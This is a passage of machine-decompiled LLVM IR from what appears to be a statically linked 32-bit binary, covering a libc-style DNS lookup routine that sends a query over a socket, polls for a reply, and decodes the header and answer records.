  store i32 %v0_8055f78, i32* %v3_8055f78, align 4
  %v1_8055f79 = add i32 %v0_8055f6a, 8
  %v2_8055f79 = inttoptr i32 %v1_8055f79 to i32*
  store i32 28, i32* %v2_8055f79, align 4
  %v0_8055f7b = load i32, i32* %eax.global-to-local, align 4
  %v2_8055f7b = add i32 %v0_8055f6a, 4
  %v3_8055f7b = inttoptr i32 %v2_8055f7b to i32*
  store i32 %v0_8055f7b, i32* %v3_8055f7b, align 4
  %v1_8055f7c = add i32 %v0_8055f6a, 36
  %v2_8055f7c = inttoptr i32 %v1_8055f7c to i32*
  %v3_8055f7c = load i32, i32* %v2_8055f7c, align 4
  %v6_8055f7c = inttoptr i32 %v0_8055f6a to i32*
  store i32 %v3_8055f7c, i32* %v6_8055f7c, align 4
  %v4_8055f80 = call i32 @__libc_connect(i32 -1, i32 %v15_8055d44, i32 %v3_8055da3)
  store i32 %v4_8055f80, i32* %eax.global-to-local, align 4
  %v0_8055f85 = load i32, i32* @esp, align 4
  %v2_8055f88 = icmp slt i32 %v4_8055f80, 0
  %v1_8055f8a = icmp eq i1 %v2_8055f88, false
  br i1 %v1_8055f8a, label %dec_label_pc_8055fa3, label %dec_label_pc_8055f8c

dec_label_pc_8055f8c:                             ; preds = %dec_label_pc_8055f71
  %v1_8055f8c = call i32 @__errno_location(i32 -1)
  store i32 %v1_8055f8c, i32* %eax.global-to-local, align 4
  %v1_8055f91 = inttoptr i32 %v1_8055f8c to i32*
  %v2_8055f91 = load i32, i32* %v1_8055f91, align 4
  %v11_8055f91 = icmp eq i32 %v2_8055f91, 101
  %v0_8056303.pre = load i32, i32* @esp, align 4
  br i1 %v11_8055f91, label %dec_label_pc_8056303, label %dec_label_pc_8055f9a

dec_label_pc_8055f9a:                             ; preds = %dec_label_pc_8055f8c, %dec_label_pc_8055f53
  %v17_8055f9a = phi i32 [ %v1_8055f6a, %dec_label_pc_8055f53 ], [ %v0_8056303.pre, %dec_label_pc_8055f8c ]
  %v1_8055f9a = add i32 %v17_8055f9a, 28
  %v2_8055f9a = inttoptr i32 %v1_8055f9a to i32*
  %v3_8055f9a = load i32, i32* %v2_8055f9a, align 4
  %v4_8055f9a = add i32 %v3_8055f9a, 1
  store i32 %v4_8055f9a, i32* %v2_8055f9a, align 4
  br label %dec_label_pc_8056324.backedge

dec_label_pc_8055fa3:                             ; preds = %dec_label_pc_8055f71
  %v0_8055fa3 = load i32, i32* @ebx, align 4
  %v1_8055fa3 = load i32, i32* @esi, align 4
  %v2_8055fa3 = add i32 %v1_8055fa3, %v0_8055fa3
  store i32 %v2_8055fa3, i32* %eax.global-to-local, align 4
  %v1_8055fa6 = add i32 %v0_8055f85, 12
  %v2_8055fa6 = inttoptr i32 %v1_8055fa6 to i32*
  store i32 0, i32* %v2_8055fa6, align 4
  %v0_8055fa8 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055fa8 = add i32 %v0_8055f85, 8
  %v3_8055fa8 = inttoptr i32 %v2_8055fa8 to i32*
  store i32 %v0_8055fa8, i32* %v3_8055fa8, align 4
  %v2_8055fa9 = add i32 %v0_8055f85, 4
  %v3_8055fa9 = inttoptr i32 %v2_8055fa9 to i32*
  store i32 %v2_8055cb6, i32* %v3_8055fa9, align 4
  %v1_8055faa = add i32 %v0_8055f85, 36
  %v2_8055faa = inttoptr i32 %v1_8055faa to i32*
  %v3_8055faa = load i32, i32* %v2_8055faa, align 4
  %v6_8055faa = inttoptr i32 %v0_8055f85 to i32*
  store i32 %v3_8055faa, i32* %v6_8055faa, align 4
  %v5_8055fae = call i32 @__libc_send(i32 -1, i32 %v15_8055d44, i32 %v3_8055da3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055fae, i32* %eax.global-to-local, align 4
  %v0_8055fb3 = load i32, i32* @esp, align 4
  %v1_8055fb3 = add i32 %v0_8055fb3, 36
  %v2_8055fb3 = inttoptr i32 %v1_8055fb3 to i32*
  %v3_8055fb3 = load i32, i32* %v2_8055fb3, align 4
  %v2_8055fb7 = add i32 %v0_8055fb3, 228
  %v3_8055fb7 = inttoptr i32 %v2_8055fb7 to i32*
  store i32 %v3_8055fb3, i32* %v3_8055fb7, align 4
  %v0_8055fbe = load i32, i32* @esp, align 4
  %v1_8055fbe = add i32 %v0_8055fbe, 232
  %v2_8055fbe = inttoptr i32 %v1_8055fbe to i16*
  store i16 1, i16* %v2_8055fbe, align 2
  %v0_8055fc8 = load i32, i32* @esp, align 4
  %v1_8055fcb = add i32 %v0_8055fc8, 8
  %v2_8055fcb = inttoptr i32 %v1_8055fcb to i32*
  store i32 10000, i32* %v2_8055fcb, align 4
  %v1_8055fd0 = add i32 %v0_8055fc8, 4
  %v2_8055fd0 = inttoptr i32 %v1_8055fd0 to i32*
  store i32 1, i32* %v2_8055fd0, align 4
  %v1_8055fd2 = add i32 %v0_8055fc8, 228
  store i32 %v1_8055fd2, i32* %eax.global-to-local, align 4
  %v3_8055fd9 = inttoptr i32 %v0_8055fc8 to i32*
  store i32 %v1_8055fd2, i32* %v3_8055fd9, align 4
  %v0_8055fda = call i32 @__libc_poll()
  store i32 %v0_8055fda, i32* %eax.global-to-local, align 4
  %v0_8055fdf = load i32, i32* @esp, align 4
  %v1_8055fdf = add i32 %v0_8055fdf, 16
  %tmp49 = icmp slt i32 %v0_8055fda, 1
  br i1 %tmp49, label %dec_label_pc_8056303, label %dec_label_pc_8055fea

dec_label_pc_8055fea:                             ; preds = %dec_label_pc_8055fa3
  %v1_8055fea = add i32 %v0_8055fdf, 12
  %v2_8055fea = inttoptr i32 %v1_8055fea to i32*
  store i32 0, i32* %v2_8055fea, align 4
  %v1_8055fec = add i32 %v0_8055fdf, 8
  %v2_8055fec = inttoptr i32 %v1_8055fec to i32*
  store i32 512, i32* %v2_8055fec, align 4
  %v2_8055ff1 = add i32 %v0_8055fdf, 4
  %v3_8055ff1 = inttoptr i32 %v2_8055ff1 to i32*
  store i32 %v2_8055cb6, i32* %v3_8055ff1, align 4
  %v1_8055ff2 = add i32 %v0_8055fdf, 36
  %v2_8055ff2 = inttoptr i32 %v1_8055ff2 to i32*
  %v3_8055ff2 = load i32, i32* %v2_8055ff2, align 4
  %v6_8055ff2 = inttoptr i32 %v0_8055fdf to i32*
  store i32 %v3_8055ff2, i32* %v6_8055ff2, align 4
  %v5_8055ff6 = call i32 @__libc_recv(i32 -1, i32 %v15_8055d44, i32 %v3_8055da3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055ff6, i32* @eax, align 4
  %v1_8055ffb = load i32, i32* @esp, align 4
  %v2_8055ffb = add i32 %v1_8055ffb, 32
  %v3_8055ffb = inttoptr i32 %v2_8055ffb to i32*
  store i32 %v5_8055ff6, i32* %v3_8055ffb, align 4
  %v0_8055fff = load i32, i32* @esp, align 4
  %v1_8055fff = add i32 %v0_8055fff, 16
  %v7_8056005 = icmp sgt i32 %v5_8055ff6, 11
  br i1 %v7_8056005, label %dec_label_pc_805600b, label %dec_label_pc_80562b8

dec_label_pc_805600b:                             ; preds = %dec_label_pc_8055fea
  %v0_805600b = load i32, i32* @ebx, align 4
  %v2_805600b = add i32 %v0_8055fff, 12
  %v3_805600b = inttoptr i32 %v2_805600b to i32*
  store i32 %v0_805600b, i32* %v3_805600b, align 4
  %v0_805600c = load i32, i32* @ebx, align 4
  %v2_805600c = add i32 %v0_8055fff, 8
  %v3_805600c = inttoptr i32 %v2_805600c to i32*
  store i32 %v0_805600c, i32* %v3_805600c, align 4
  %v1_805600d = add i32 %v0_8055fff, 84
  store i32 %v1_805600d, i32* %eax.global-to-local, align 4
  %v2_8056011 = add i32 %v0_8055fff, 4
  %v3_8056011 = inttoptr i32 %v2_8056011 to i32*
  store i32 %v1_805600d, i32* %v3_8056011, align 4
  %v3_8056012 = inttoptr i32 %v0_8055fff to i32*
  store i32 %v2_8055cb6, i32* %v3_8056012, align 4
  %v0_8056013 = call i32 @__decode_header()
  store i32 %v0_8056013, i32* %eax.global-to-local, align 4
  %v0_8056018 = load i32, i32* @esp, align 4
  %v1_8056018 = add i32 %v0_8056018, 84
  %v2_8056018 = inttoptr i32 %v1_8056018 to i32*
  %v3_8056018 = load i32, i32* %v2_8056018, align 4
  store i32 %v3_8056018, i32* %edx.global-to-local, align 4
  %v2_805601c = add i32 %v0_8056018, 72
  %v3_805601c = inttoptr i32 %v2_805601c to i32*
  store i32 %v3_8056018, i32* %v3_805601c, align 4
  %v0_8056020 = load i32, i32* @esp, align 4
  %v1_8056020 = add i32 %v0_8056020, 16
  %v1_8056023 = add i32 %v0_8056020, 60
  %v2_8056023 = inttoptr i32 %v1_8056023 to i32*
  %v3_8056023 = load i32, i32* %v2_8056023, align 4
  store i32 %v3_8056023, i32* @eax, align 4
  %v0_8056027 = load i32, i32* %edx.global-to-local, align 4
  %v12_8056027 = icmp eq i32 %v0_8056027, %v3_8056023
  %v1_8056029 = icmp eq i1 %v12_8056027, false
  br i1 %v1_8056029, label %dec_label_pc_80562b8, label %dec_label_pc_805602f

dec_label_pc_805602f:                             ; preds = %dec_label_pc_805600b
  %v1_805602f = add i32 %v0_8056020, 88
  %v2_805602f = inttoptr i32 %v1_805602f to i32*
  %v3_805602f = load i32, i32* %v2_805602f, align 4
  %v4_805602f = icmp eq i32 %v3_805602f, 0
  br i1 %v4_805602f, label %dec_label_pc_80562b8, label %dec_label_pc_805603a

dec_label_pc_805603a:                             ; preds = %dec_label_pc_805602f
  %v1_805603a = add i32 %v0_8056020, 112
  %v2_805603a = inttoptr i32 %v1_805603a to i32*
  %v3_805603a = load i32, i32* %v2_805603a, align 4
  store i32 %v3_805603a, i32* @eax, align 4
  %v9_805603e = icmp eq i32 %v3_805603a, 3
  %v1_8056041 = icmp eq i1 %v9_805603e, false
  br i1 %v1_8056041, label %dec_label_pc_80560a9, label %dec_label_pc_8056043

dec_label_pc_8056043:                             ; preds = %dec_label_pc_805603a
  %v1_8056043 = add i32 %v0_8056020, 67
  %v2_8056043 = inttoptr i32 %v1_8056043 to i8*
  %v3_8056043 = load i8, i8* %v2_8056043, align 1
  %v4_8056043 = icmp eq i8 %v3_8056043, 0
  %v1_8056048 = icmp eq i1 %v4_8056043, false
  br i1 %v1_8056048, label %dec_label_pc_8056099, label %dec_label_pc_805604a

dec_label_pc_805604a:                             ; preds = %dec_label_pc_8056043
  %v0_805604a = load i32, i32* @ecx, align 4
  %v2_805604a = add i32 %v0_8056020, 12
  %v3_805604a = inttoptr i32 %v2_805604a to i32*
  store i32 %v0_805604a, i32* %v3_805604a, align 4
  %v1_805604b = add i32 %v0_8056020, 8
  %v2_805604b = inttoptr i32 %v1_805604b to i32*
  store i32 ptrtoint (i32* @global_var_805d448.518 to i32), i32* %v2_805604b, align 4
  %v1_8056050 = add i32 %v0_8056020, 4
  %v2_8056050 = inttoptr i32 %v1_8056050 to i32*
  store i32 134564459, i32* %v2_8056050, align 4
  %v1_8056055 = add i32 %v0_8056020, 200
  store i32 %v1_8056055, i32* @esi, align 4
  %v3_805605c = inttoptr i32 %v0_8056020 to i32*
  store i32 %v1_8056055, i32* %v3_805605c, align 4
  %v2_805605d = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d44)
  store i32 %v2_805605d, i32* %eax.global-to-local, align 4
  %v0_8056062 = load i32, i32* @esp, align 4
  %v1_8056062 = inttoptr i32 %v0_8056062 to i32*
  store i32 ptrtoint (i32* @global_var_805d448.518 to i32), i32* %v1_8056062, align 4
  %v1_8056069 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056069, i32* %eax.global-to-local, align 4
  %v0_805606e = load i32, i32* @esp, align 4
  %v1_805606e = inttoptr i32 %v0_805606e to i32*
  %v2_805606e = load i32, i32* %v1_805606e, align 4
  store i32 %v2_805606e, i32* @eax, align 4
  %v3_805606e = add i32 %v0_805606e, 4
  %v1_805606f = inttoptr i32 %v3_805606e to i32*
  %v2_805606f = load i32, i32* %v1_805606f, align 4
  store i32 %v2_805606f, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_805606f, align 4
  %v0_8056072 = load i32, i32* @esi, align 4
  store i32 %v0_8056072, i32* %v1_805606e, align 4
  %v0_8056073 = load i32, i32* @global_var_8063b38.583, align 8
  store i32 %v0_8056073, i32* %ebx.global-to-local, align 4
  %v2_8056079 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d44)
  store i32 %v2_8056079, i32* %eax.global-to-local, align 4
  %v0_805607e = load i32, i32* @esp, align 4
  %v1_8056081 = add i32 %v0_8056073, -1
  store i32 %v1_8056081, i32* @ebx, align 4
  %v1_8056082 = add i32 %v0_805607e, 52
  %v2_8056082 = inttoptr i32 %v1_8056082 to i32*
  %v3_8056082 = load i32, i32* %v2_8056082, align 4
  %v5_8056082 = sub i32 %v3_8056082, %v1_8056081
  %v11_8056082 = xor i32 %v3_8056082, %v1_8056081
  %v12_8056082 = xor i32 %v5_8056082, %v3_8056082
  %v13_8056082 = and i32 %v12_8056082, %v11_8056082
  %v14_8056082 = icmp slt i32 %v13_8056082, 0
  %v16_8056082 = icmp slt i32 %v5_8056082, 0
  %v2_8056086 = icmp eq i1 %v16_8056082, %v14_8056082
  br i1 %v2_8056086, label %dec_label_pc_8056099, label %dec_label_pc_8056088

dec_label_pc_8056088:                             ; preds = %dec_label_pc_805604a
  %v4_8056088 = add i32 %v3_8056082, 1
  store i32 %v4_8056088, i32* %v2_8056082, align 4
  %v0_805608c = load i32, i32* @esp, align 4
  %v1_805608c = add i32 %v0_805608c, 56
  %v2_805608c = inttoptr i32 %v1_805608c to i32*
  %v3_805608c = load i32, i32* %v2_805608c, align 4
  store i32 %v3_805608c, i32* %edx.global-to-local, align 4
  %v2_8056090 = add i32 %v0_805608c, 44
  %v3_8056090 = inttoptr i32 %v2_8056090 to i32*
  store i32 %v3_805608c, i32* %v3_8056090, align 4
  br label %dec_label_pc_8056324.backedge

dec_label_pc_8056099:                             ; preds = %dec_label_pc_805604a, %dec_label_pc_8056043
  %v0_8056099 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056099, i32* %eax.global-to-local, align 4
  %v1_805609e = inttoptr i32 %v0_8056099 to i32*
  store i32 1, i32* %v1_805609e, align 4
  br label %dec_label_pc_805635c

dec_label_pc_80560a9:                             ; preds = %dec_label_pc_805603a
  %v1_80560a9 = icmp eq i32 %v3_805603a, 0
  %v1_80560ab = icmp eq i1 %v1_80560a9, false
  br i1 %v1_80560ab, label %dec_label_pc_80562b8, label %dec_label_pc_80560b1

dec_label_pc_80560b1:                             ; preds = %dec_label_pc_80560a9
  %v1_80560b1 = add i32 %v0_8056020, 120
  %v2_80560b1 = inttoptr i32 %v1_80560b1 to i32*
  %v3_80560b1 = load i32, i32* %v2_80560b1, align 4
  %tmp50 = icmp slt i32 %v3_80560b1, 1
  br i1 %tmp50, label %dec_label_pc_80560c1, label %dec_label_pc_80560b8

dec_label_pc_80560b8:                             ; preds = %dec_label_pc_80560b1
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_80560e056 = add i32 %v0_8056020, 116
  %v3_80560e057 = inttoptr i32 %v2_80560e056 to i32*
  %v4_80560e058 = load i32, i32* %v3_80560e057, align 4
  %v5_80560e059 = sub i32 0, %v4_80560e058
  %v13_80560e063 = and i32 %v4_80560e058, %v5_80560e059
  %v14_80560e064 = icmp slt i32 %v13_80560e063, 0
  %v16_80560e066 = icmp slt i32 %v5_80560e059, 0
  %v2_80560e467 = icmp eq i1 %v16_80560e066, %v14_80560e064
  br i1 %v2_80560e467, label %dec_label_pc_80560e6, label %dec_label_pc_80560d1

dec_label_pc_80560c1:                             ; preds = %dec_label_pc_80560b1
  %v0_80560c1 = call i32 @__GI___h_errno_location()
  store i32 %v0_80560c1, i32* %eax.global-to-local, align 4
  %v1_80560c6 = inttoptr i32 %v0_80560c1 to i32*
  store i32 4, i32* %v1_80560c6, align 4
  br label %dec_label_pc_805635c

dec_label_pc_80560d1:                             ; preds = %dec_label_pc_80560b8, %dec_label_pc_80560d1
  %v0_80560e869 = phi i32 [ %v1_80560dd, %dec_label_pc_80560d1 ], [ %v1_8056020, %dec_label_pc_80560b8 ]
  %v0_80560d168 = phi i32 [ %v0_80560d5, %dec_label_pc_80560d1 ], [ %v3_805603a, %dec_label_pc_80560b8 ]
  %v2_80560d1 = add i32 %v0_80560e869, -4
  %v3_80560d1 = inttoptr i32 %v2_80560d1 to i32*
  store i32 %v0_80560d168, i32* %v3_80560d1, align 4
  %v0_80560d2 = load i32, i32* @eax, align 4
  %v2_80560d2 = add i32 %v0_80560e869, -8
  %v3_80560d2 = inttoptr i32 %v2_80560d2 to i32*
  store i32 %v0_80560d2, i32* %v3_80560d2, align 4
  %v0_80560d3 = load i32, i32* @esi, align 4
  %v2_80560d3 = add i32 %v0_80560e869, -12
  %v3_80560d3 = inttoptr i32 %v2_80560d3 to i32*
  store i32 %v0_80560d3, i32* %v3_80560d3, align 4
  %v2_80560d4 = add i32 %v0_80560e869, -16
  %v3_80560d4 = inttoptr i32 %v2_80560d4 to i32*
  store i32 %v2_8055cb6, i32* %v3_80560d4, align 4
  %v0_80560d5 = call i32 @__length_question()
  store i32 %v0_80560d5, i32* @eax, align 4
  %v0_80560da = load i32, i32* @ebx, align 4
  %v1_80560da = add i32 %v0_80560da, 1
  store i32 %v1_80560da, i32* @ebx, align 4
  %v0_80560db = load i32, i32* @esi, align 4
  %v2_80560db = add i32 %v0_80560db, %v0_80560d5
  store i32 %v2_80560db, i32* @esi, align 4
  %v0_80560dd = load i32, i32* @esp, align 4
  %v1_80560dd = add i32 %v0_80560dd, 16
  %v2_80560e0 = add i32 %v0_80560dd, 116
  %v3_80560e0 = inttoptr i32 %v2_80560e0 to i32*
  %v4_80560e0 = load i32, i32* %v3_80560e0, align 4
  %v5_80560e0 = sub i32 %v1_80560da, %v4_80560e0
  %v11_80560e0 = xor i32 %v4_80560e0, %v1_80560da
  %v12_80560e0 = xor i32 %v5_80560e0, %v1_80560da
  %v13_80560e0 = and i32 %v12_80560e0, %v11_80560e0
  %v14_80560e0 = icmp slt i32 %v13_80560e0, 0
  %v16_80560e0 = icmp slt i32 %v5_80560e0, 0
  %v2_80560e4 = icmp eq i1 %v16_80560e0, %v14_80560e0
  br i1 %v2_80560e4, label %dec_label_pc_80560e6, label %dec_label_pc_80560d1

dec_label_pc_80560e6:                             ; preds = %dec_label_pc_80560d1, %dec_label_pc_80560b8
  %v0_80560e8.lcssa = phi i32 [ %v1_8056020, %dec_label_pc_80560b8 ], [ %v1_80560dd, %dec_label_pc_80560d1 ]
  store i32 0, i32* @ebx, align 4
  %v1_80560e8 = add i32 %v0_80560e8.lcssa, 27
  %v2_80560e8 = inttoptr i32 %v1_80560e8 to i8*
  store i8 1, i8* %v2_80560e8, align 1
  %v0_8056216.pre = load i32, i32* @ebx, align 4
  %v1_8056216.pre = load i32, i32* @esp, align 4
  %v2_805621670 = add i32 %v1_8056216.pre, 104
  %v3_805621671 = inttoptr i32 %v2_805621670 to i32*
  %v4_805621672 = load i32, i32* %v3_805621671, align 4
  %v5_805621673 = sub i32 %v0_8056216.pre, %v4_805621672
  %v11_805621675 = xor i32 %v4_805621672, %v0_8056216.pre
  %v12_805621676 = xor i32 %v5_805621673, %v0_8056216.pre
  %v13_805621677 = and i32 %v12_805621676, %v11_805621675
  %v14_805621678 = icmp slt i32 %v13_805621677, 0
  %v16_805621680 = icmp slt i32 %v5_805621673, 0
  %v2_805621a81 = icmp eq i1 %v16_805621680, %v14_805621678
  br i1 %v2_805621a81, label %dec_label_pc_8056226, label %dec_label_pc_805621c.lr.ph

dec_label_pc_805621c.lr.ph:                       ; preds = %dec_label_pc_80560e6
  %v0_805621c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805621c

dec_label_pc_80560f2:                             ; preds = %dec_label_pc_805621c
  %v1_80560f2 = add i32 %v0_80560f282, 116
  store i32 %v1_80560f2, i32* %eax.global-to-local, align 4
  %v2_80560f6 = add i32 %v0_80560f282, -4
  %v3_80560f6 = inttoptr i32 %v2_80560f6 to i32*
  store i32 %v1_80560f2, i32* %v3_80560f6, align 4
  %v3_80560f7 = load i32, i32* %v3_805621c, align 4
  %v5_80560f7 = add i32 %v0_80560f282, -8
  %v6_80560f7 = inttoptr i32 %v5_80560f7 to i32*
  store i32 %v3_80560f7, i32* %v6_80560f7, align 4
  %v0_80560fb = load i32, i32* @esi, align 4
  %v2_80560fb = add i32 %v0_80560f282, -12
  %v3_80560fb = inttoptr i32 %v2_80560fb to i32*
  store i32 %v0_80560fb, i32* %v3_80560fb, align 4
  %v2_80560fc = add i32 %v0_80560f282, -16
  %v3_80560fc = inttoptr i32 %v2_80560fc to i32*
  store i32 %v2_8055cb6, i32* %v3_80560fc, align 4
  %v0_80560fd = call i32 @__decode_answer()
  store i32 %v0_80560fd, i32* @eax, align 4
  %v1_8056102 = load i32, i32* @esp, align 4
  %v2_8056102 = add i32 %v1_8056102, 68
  %v3_8056102 = inttoptr i32 %v2_8056102 to i32*
  store i32 %v0_80560fd, i32* %v3_8056102, align 4
  %v0_8056106 = load i32, i32* @esp, align 4
  %v1_8056106 = add i32 %v0_8056106, 16
  %v2_8056109 = icmp slt i32 %v0_80560fd, 0
  %v1_805610b = icmp eq i1 %v2_8056109, false
  br i1 %v1_805610b, label %dec_label_pc_8056125, label %dec_label_pc_805610d

dec_label_pc_805610d:                             ; preds = %dec_label_pc_80560f2
  %v0_805610d = load i32, i32* @ebx, align 4
  %v1_805610d = icmp eq i32 %v0_805610d, 0
  br i1 %v1_805610d, label %dec_label_pc_80562b8, label %dec_label_pc_8056115

dec_label_pc_8056115:                             ; preds = %dec_label_pc_805610d
  %v1_8056115 = add i32 %v0_8056106, 100
  %v2_8056115 = inttoptr i32 %v1_8056115 to i32*
  %v3_8056115 = load i32, i32* %v2_8056115, align 4
  %v4_8056115 = icmp eq i32 %v3_8056115, 0
  br i1 %v4_8056115, label %dec_label_pc_80562b8, label %dec_label_pc_8056226

dec_label_pc_8056125:                             ; preds = %dec_label_pc_80560f2
  %v1_8056125 = add i32 %v0_8056106, 43
  %v2_8056125 = inttoptr i32 %v1_8056125 to i8*
  %v3_8056125 = load i8, i8* %v2_8056125, align 1
  %v4_8056125 = icmp eq i8 %v3_8056125, 0
  br i1 %v4_8056125, label %dec_label_pc_80561c6, label %dec_label_pc_8056130

dec_label_pc_8056130:                             ; preds = %dec_label_pc_8056125
  %v0_8056130 = load i32, i32* @edi, align 4
  %v1_8056130 = add i32 %v0_8056130, 28
  %v2_8056130 = inttoptr i32 %v1_8056130 to i32*
  %v3_8056130 = load i32, i32* %v2_8056130, align 4
  store i32 %v3_8056130, i32* %eax.global-to-local, align 4
  %v2_8056133 = add i32 %v0_8056106, 160
  %v3_8056133 = inttoptr i32 %v2_8056133 to i32*
  store i32 %v3_8056130, i32* %v3_8056133, align 4
  %v0_805613a = load i32, i32* @edi, align 4
  %v1_805613a = add i32 %v0_805613a, 32
  %v2_805613a = inttoptr i32 %v1_805613a to i32*
  %v3_805613a = load i32, i32* %v2_805613a, align 4
  store i32 %v3_805613a, i32* %eax.global-to-local, align 4
  %v1_805613d = load i32, i32* @esp, align 4
  %v2_805613d = add i32 %v1_805613d, 148
  %v3_805613d = inttoptr i32 %v2_805613d to i32*
  store i32 %v3_805613a, i32* %v3_805613d, align 4
  %v0_8056144 = load i32, i32* @edi, align 4
  %v1_8056144 = add i32 %v0_8056144, 36
  %v2_8056144 = inttoptr i32 %v1_8056144 to i32*
  %v3_8056144 = load i32, i32* %v2_8056144, align 4
  store i32 %v3_8056144, i32* %eax.global-to-local, align 4
  %v1_8056147 = load i32, i32* @esp, align 4
  %v2_8056147 = add i32 %v1_8056147, 152
  %v3_8056147 = inttoptr i32 %v2_8056147 to i32*
  store i32 %v3_8056144, i32* %v3_8056147, align 4
  %v0_805614e = load i32, i32* @ecx, align 4
  %v1_805614e = load i32, i32* @esp, align 4
  %v2_805614e = add i32 %v1_805614e, -4
  %v3_805614e = inttoptr i32 %v2_805614e to i32*
  store i32 %v0_805614e, i32* %v3_805614e, align 4
  %v1_805614f = add i32 %v1_805614e, -8
  %v2_805614f = inttoptr i32 %v1_805614f to i32*
  store i32 40, i32* %v2_805614f, align 4
  %v1_8056151 = add i32 %v1_805614e, 116
  store i32 %v1_8056151, i32* %edx.global-to-local, align 4
  %v2_8056155 = add i32 %v1_805614e, -12
  %v3_8056155 = inttoptr i32 %v2_8056155 to i32*
  store i32 %v1_8056151, i32* %v3_8056155, align 4
  %v0_8056156 = load i32, i32* @edi, align 4
  %v2_8056156 = add i32 %v1_805614e, -16
  %v3_8056156 = inttoptr i32 %v2_8056156 to i32*
  store i32 %v0_8056156, i32* %v3_8056156, align 4
  %v5_8056157 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8055d44, i32 %v3_8055da3)
  store i32 %v5_8056157, i32* %eax.global-to-local, align 4
  %v0_805615c = load i32, i32* @edi, align 4
  %v1_805615c = add i32 %v0_805615c, 4
  %v2_805615c = inttoptr i32 %v1_805615c to i32*
  %v3_805615c = load i32, i32* %v2_805615c, align 4
  store i32 %v3_805615c, i32* %eax.global-to-local, align 4
  %v0_805615f = load i32, i32* @esp, align 4
  %v1_805615f = add i32 %v0_805615f, 16
  %v9_8056162 = icmp eq i32 %v3_805615c, 24
  br i1 %v9_8056162, label %dec_label_pc_8056130.dec_label_pc_8056189_crit_edge, label %dec_label_pc_8056167

dec_label_pc_8056130.dec_label_pc_8056189_crit_edge: ; preds = %dec_label_pc_8056130
  %.pre25 = add i32 %v0_805615f, 260
  %.pre26 = inttoptr i32 %.pre25 to i32*
  %v4_8056189.pre = load i32, i32* %.pre26, align 4
  br label %dec_label_pc_8056189

dec_label_pc_8056167:                             ; preds = %dec_label_pc_8056130
  %v1_8056167 = add i32 %v0_805615c, 28
  %v2_8056167 = inttoptr i32 %v1_8056167 to i32*
  %v3_8056167 = load i32, i32* %v2_8056167, align 4
  %v4_8056167 = icmp eq i32 %v3_8056167, 0
  br i1 %v4_8056167, label %dec_label_pc_8056226, label %dec_label_pc_8056171

dec_label_pc_8056171:                             ; preds = %dec_label_pc_8056167
  %v1_8056171 = add i32 %v0_805615f, 260
  %v2_8056171 = inttoptr i32 %v1_8056171 to i32*
  %v3_8056171 = load i32, i32* %v2_8056171, align 4
  %v12_8056171 = icmp eq i32 %v3_8056171, 1
  br i1 %v12_8056171, label %dec_label_pc_8056189, label %dec_label_pc_805617b

dec_label_pc_805617b:                             ; preds = %dec_label_pc_8056171
  %v12_805617b = icmp eq i32 %v3_8056171, 28
  %v1_8056183 = icmp eq i1 %v12_805617b, false
  br i1 %v1_8056183, label %dec_label_pc_8056226, label %dec_label_pc_8056189

dec_label_pc_8056189:                             ; preds = %dec_label_pc_8056130.dec_label_pc_8056189_crit_edge, %dec_label_pc_805617b, %dec_label_pc_8056171
  %v4_8056189 = phi i32 [ %v4_8056189.pre, %dec_label_pc_8056130.dec_label_pc_8056189_crit_edge ], [ %v3_8056171, %dec_label_pc_805617b ], [ 1, %dec_label_pc_8056171 ]
  %v15_8056189 = icmp eq i32 %v3_805615c, %v4_8056189
  br i1 %v15_8056189, label %dec_label_pc_805619e, label %dec_label_pc_8056192

dec_label_pc_8056192:                             ; preds = %dec_label_pc_8056189
  %v1_8056195 = inttoptr i32 %v0_805615c to i32*
  %v2_8056195 = load i32, i32* %v1_8056195, align 4
  %v5_8056195 = inttoptr i32 %v0_805615f to i32*
  store i32 %v2_8056195, i32* %v5_8056195, align 4
  %v1_8056197 = call i32 @free(i32 -1)
  store i32 %v1_8056197, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805620e

dec_label_pc_805619e:                             ; preds = %dec_label_pc_8056189
  %v0_805619e = load i32, i32* @ebx, align 4
  %v1_80561a0 = sub i32 -1, %v0_805619e
  store i32 %v1_80561a0, i32* %eax.global-to-local, align 4
  %v2_80561a2 = add i32 %v0_805615f, 120
  %v3_80561a2 = inttoptr i32 %v2_80561a2 to i32*
  %v4_80561a2 = load i32, i32* %v3_80561a2, align 4
  %v5_80561a2 = add i32 %v4_80561a2, %v1_80561a0
  store i32 %v5_80561a2, i32* %eax.global-to-local, align 4
  %v2_80561a6 = add i32 %v0_805615c, 36
  %v3_80561a6 = inttoptr i32 %v2_80561a6 to i32*
  store i32 %v5_80561a2, i32* %v3_80561a6, align 4
  %v0_80561a9 = load i32, i32* @edi, align 4
  %v1_80561a9 = add i32 %v0_80561a9, 16
  %v2_80561a9 = inttoptr i32 %v1_80561a9 to i32*
  %v3_80561a9 = load i32, i32* %v2_80561a9, align 4
  %v1_80561ac = add i32 %v3_80561a9, 4
  store i32 %v1_80561ac, i32* %eax.global-to-local, align 4
  %v2_80561af = add i32 %v0_80561a9, 36
  %v3_80561af = inttoptr i32 %v2_80561af to i32*
  %v4_80561af = load i32, i32* %v3_80561af, align 4
  %v7_80561af = mul i32 %v4_80561af, %v1_80561ac
  store i32 %v7_80561af, i32* %eax.global-to-local, align 4
  %v2_80561b3 = add i32 %v0_80561a9, 32
  %v3_80561b3 = inttoptr i32 %v2_80561b3 to i32*
  %v4_80561b3 = load i32, i32* %v3_80561b3, align 4
  %v6_80561b6 = icmp ugt i32 %v7_80561af, %v4_80561b3
  br i1 %v6_80561b6, label %dec_label_pc_805619e.dec_label_pc_8056226.loopexit_crit_edge, label %dec_label_pc_80561b8

dec_label_pc_805619e.dec_label_pc_8056226.loopexit_crit_edge: ; preds = %dec_label_pc_805619e
  %v0_8056226.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056226

dec_label_pc_80561b8:                             ; preds = %dec_label_pc_805619e
  store i32 0, i32* %v3_80561af, align 4
